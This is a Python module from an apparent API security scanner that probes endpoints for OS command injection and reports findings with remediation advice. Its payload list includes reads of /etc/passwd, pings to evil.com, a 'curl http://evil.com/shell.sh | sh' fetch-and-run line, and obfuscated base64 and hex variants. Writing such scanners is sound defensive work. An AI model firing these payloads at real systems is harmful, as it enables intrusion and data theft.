"""
Command Injection attack module.

Tests API endpoints for OS command injection vulnerabilities by injecting
shell commands in parameters and request bodies.
"""

import time
import re
from typing import Any, Optional
import requests

from ..models import (
    AttackType,
    AttackResult,
    Endpoint,
    Parameter,
    Severity,
    Vulnerability
)


class CommandInjectionAttacker:
    """Performs command injection attacks on API endpoints."""
    
    # Command injection payloads
    PAYLOADS = {
        # Basic injection
        "basic": [
            "; ls",
            "| ls",
            "& ls",
            "&& ls",
            "|| ls",
            "`ls`",
            "$(ls)",
            "; ls;",
            "| ls |",
            "& ls &",
        ],
        # Time-based (blind) injection
        "time_based": [
            "; sleep 5",
            "| sleep 5",
            "& sleep 5",
            "&& sleep 5",
            "`sleep 5`",
            "$(sleep 5)",
            "; sleep 5;",
            "| sleep 5 |",
            # Windows variants
            "; timeout 5",
            "& timeout 5",
            "| timeout 5",
        ],
        # Data exfiltration
        "exfil": [
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "& cat /etc/passwd",
            "; type C:\\Windows\\System32\\drivers\\etc\\hosts",
            "| type C:\\Windows\\System32\\drivers\\etc\\hosts",
            "; id",
            "| id",
            "& whoami",
            "| whoami",
            "; uname -a",
            "| uname -a",
        ],
        # Network-based
        "network": [
            "; ping -c 1 evil.com",
            "| ping -c 1 evil.com",
            "& ping -c 1 evil.com",
            "; nslookup evil.com",
            "| nslookup evil.com",
            "; curl http://evil.com/shell.sh | sh",
        ],
        # Encoded/Obfuscated
        "obfuscated": [
            "; l''s",
            "| l''s",
            "; l\"\"s",
            "; {ls,}",
            "; $(echo bHM= | base64 -d)",  # ls base64 encoded
            "; $(printf '\\x6c\\x73')",  # ls hex
            "; $'\\x6c\\x73'",  # ls hex
        ],
        # Newline injection
        "newline": [
            "\nls",
            "\r\nls",
            "%0als",
            "%0d%0als",
        ],
    }
    
    # Indicators of successful command injection
    SUCCESS_INDICATORS = [
        # Unix file system
        "root:",
        "bin:",
        "daemon:",
        "nobody:",
        "/bin/bash",
        "/bin/sh",
        "/etc/passwd",
        "/etc/shadow",
        
        # Windows file system  
        "\\Windows\\",
        "\\System32\\",
        "WINDOWS\\system32",
        "[boot loader]",
        
        # Command output
        "total ",
        "drwx",
        "-rw-r--r--",
        "-rwxr-xr-x",
        "uid=",
        "gid=",
        "groups=",
        
        # Environment info
        "Darwin",
        "Linux",
        "Windows",
        "MINGW",
        "CYGWIN",
        
        # Error messages indicating command execution
        "sh: ",
        "bash: ",
        "cmd: ",
        "command not found",
        "No such file or directory",
        "not recognized as an internal or external command",
    ]
    
    def __init__(self, target_url: str, timeout: int = 5):
        """Initialize the command injection attacker.
        
        Args:
            target_url: Base URL of the target API
            timeout: Request timeout in seconds
        """
        self.target_url = target_url.rstrip('/')
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Sentinel/2.0.0 Security Scanner',
            'Accept': '*/*'
        })
    
    def attack(self, endpoint: Endpoint, parameters_to_test: Optional[list[str]] = None) -> list[AttackResult]:
        """Perform command injection attacks on an endpoint.
        
        Args:
            endpoint: The endpoint to attack
            parameters_to_test: Specific parameter names to test
            
        Returns:
            List of attack results
        """
        results: list[AttackResult] = []
        
        # Get testable parameters
        params_to_test = self._get_testable_parameters(endpoint, parameters_to_test)
        
        for param in params_to_test:
            # Test basic payloads first
            for payload in self.PAYLOADS["basic"][:5]:
                result = self._test_payload(endpoint, param, payload, "basic")
                results.append(result)
                
                if result.success:
                    break
            
            # Test time-based (blind) injection
            for payload in self.PAYLOADS["time_based"][:3]:
                result = self._test_payload(endpoint, param, payload, "time_based")
                results.append(result)
                
                if result.success:
                    # Confirmed blind injection, test data exfil
                    for exfil_payload in self.PAYLOADS["exfil"][:3]:
                        exfil_result = self._test_payload(endpoint, param, exfil_payload, "exfil")
                        results.append(exfil_result)
                    break
        
        return results
    
    def _get_testable_parameters(
        self, 
        endpoint: Endpoint, 
        parameters_to_test: Optional[list[str]]
    ) -> list[Parameter]:
        """Get list of parameters that might be vulnerable to command injection."""
        params = []
        
        # Parameter names often associated with command injection
        cmd_param_names = [
            'cmd', 'command', 'exec', 'execute', 'run', 'system', 'shell',
            'ping', 'host', 'ip', 'address', 'domain', 'url', 'file',
            'path', 'dir', 'folder', 'name', 'input', 'query', 'search',
            'timeout', 'delay', 'sleep', 'wait', 'callback'
        ]
        
        for param in endpoint.parameters:
            if parameters_to_test and param.name not in parameters_to_test:
                continue
            
            param_lower = param.name.lower()
            
            # Check if parameter name suggests command execution
            if any(cmd_param in param_lower for cmd_param in cmd_param_names):
                params.append(param)
            # Also test string parameters
            elif param.param_type == 'string':
                params.append(param)
        
        # Check request body
        if endpoint.request_body:
            body_params = self._extract_body_parameters(endpoint.request_body)
            for param_name in body_params:
                params.append(Parameter(
                    name=param_name,
                    location='body',
                    param_type='string'
                ))
        
        return params
    
    def _extract_body_parameters(self, request_body: dict) -> list[str]:
        """Extract parameter names from request body schema."""
        params = []
        
        content = request_body.get('content', {})
        for content_type, content_schema in content.items():
            if 'application/json' in content_type:
                schema = content_schema.get('schema', {})
                properties = schema.get('properties', {})
                params.extend(properties.keys())
        
        return params
    
    def _test_payload(
        self, 
        endpoint: Endpoint, 
        param: Parameter, 
        payload: str,
        injection_type: str
    ) -> AttackResult:
        """Test a single command injection payload."""
        start_time = time.time()
        
        try:
            url = self._build_url(endpoint.path)
            
            # For time-based injection, measure response time
            is_time_based = 'sleep' in payload.lower() or 'timeout' in payload.lower()
            
            if endpoint.method.value == 'GET':
                params = {param.name: payload}
                response = self.session.get(
                    url,
                    params=params,
                    timeout=self.timeout + 5 if is_time_based else self.timeout
                )
            else:
                body = {param.name: payload}
                response = self.session.request(
                    endpoint.method.value,
                    url,
                    json=body,
                    timeout=self.timeout + 5 if is_time_based else self.timeout
                )
            
            duration_ms = (time.time() - start_time) * 1000
            
            # Check for vulnerability
            if is_time_based:
                # Time-based detection: if response took > 4 seconds, likely vulnerable
                is_vulnerable = duration_ms > 4000
            else:
                is_vulnerable, evidence = self._check_cmd_injection(response)
            
            return AttackResult(
                endpoint=endpoint,
                attack_type=AttackType.CMD_INJECTION,
                success=is_vulnerable,
                payload=payload,
                response_status=response.status_code,
                response_body=response.text[:500],
                duration_ms=duration_ms,
                extra_data={'injection_type': injection_type}
            )
            
        except requests.exceptions.Timeout:
            # Timeout might indicate successful time-based injection
            duration_ms = (self.timeout + 5) * 1000
            return AttackResult(
                endpoint=endpoint,
                attack_type=AttackType.CMD_INJECTION,
                success=True,  # Likely time-based injection
                payload=payload,
                error_message="Request timed out (potential time-based injection)",
                duration_ms=duration_ms,
                extra_data={'injection_type': 'time_based'}
            )
        except Exception as e:
            return AttackResult(
                endpoint=endpoint,
                attack_type=AttackType.CMD_INJECTION,
                success=False,
                payload=payload,
                error_message=str(e)
            )
    
    def _build_url(self, path: str) -> str:
        """Build full URL from path."""
        return f"{self.target_url}{path}"
    
    def _check_cmd_injection(self, response: requests.Response) -> tuple[bool, Optional[str]]:
        """Check if response indicates command injection vulnerability.
        
        Returns:
            Tuple of (is_vulnerable, evidence)
        """
        response_text = response.text
        
        # Check for success indicators
        for indicator in self.SUCCESS_INDICATORS:
            if indicator in response_text:
                # Make sure it's not just part of the normal response
                # Check for command output patterns
                if self._is_command_output(response_text, indicator):
                    return True, f"Found indicator: {indicator}"
        
        return False, None
    
    def _is_command_output(self, text: str, indicator: str) -> bool:
        """Verify that the indicator is likely command output."""
        # Check for common command output patterns
        patterns = [
            r'uid=\d+',  # Unix id command
            r'gid=\d+',  # Unix id command
            r'total\s+\d+',  # ls -l output
            r'drwx[\-rwx]+',  # ls -l output
            r'\-rw[\-rwx]+',  # ls -l output
            r'root:.*:.*:.*:',  # /etc/passwd format
            r'\[boot loader\]',  # Windows boot.ini
        ]
        
        for pattern in patterns:
            if re.search(pattern, text):
                return True
        
        # Check if indicator appears in context suggesting command output
        lines = text.split('\n')
        for line in lines:
            if indicator in line and len(line.strip()) < 200:
                # Short lines with indicators often are command output
                return True
        
        return False
    
    def create_vulnerability(self, result: AttackResult, endpoint: Endpoint) -> Vulnerability:
        """Create a Vulnerability object from an attack result."""
        injection_type = 'basic'
        if result.extra_data:
            injection_type = result.extra_data.get('injection_type', 'basic')
        
        severity = Severity.CRITICAL
        if injection_type == 'time_based':
            severity = Severity.HIGH
        
        return Vulnerability(
            endpoint=endpoint,
            attack_type=AttackType.CMD_INJECTION,
            severity=severity,
            title=f"OS Command Injection in {endpoint.full_path}",
            description=(
                f"OS Command Injection vulnerability detected. The application passes "
                f"user-controlled input to system commands without proper sanitization. "
                f"An attacker can execute arbitrary commands on the server, potentially "
                f"leading to complete system compromise, data exfiltration, or "
                f"lateral movement within the network."
            ),
            payload=result.payload or "",
            proof_of_concept=(
                f"Request: {endpoint.method.value} {endpoint.path}\n"
                f"Payload: {result.payload}\n"
                f"Injection Type: {injection_type}\n"
                f"Response Status: {result.response_status}\n"
                f"Response Time: {result.duration_ms:.0f}ms"
            ),
            recommendation=(
                "1. Avoid calling system commands with user input\n"
                "2. Use allowlists for expected input values\n"
                "3. Use built-in language functions instead of shell commands\n"
                "4. Escape shell metacharacters if shell commands are necessary\n"
                "5. Run applications with minimal privileges\n"
                "6. Use containerization/sandboxing to limit command execution\n"
                "7. Implement strict input validation\n"
                "8. Use parameterized APIs instead of string concatenation"
            ),
            cwe_id="CWE-78",
            owasp_category="A03:2021 - Injection",
            response_evidence=result.response_body,
            cvss_score=9.8,
            references=[
                "https://owasp.org/www-community/attacks/Command_Injection",
                "https://portswigger.net/web-security/os-command-injection"
            ]
        )
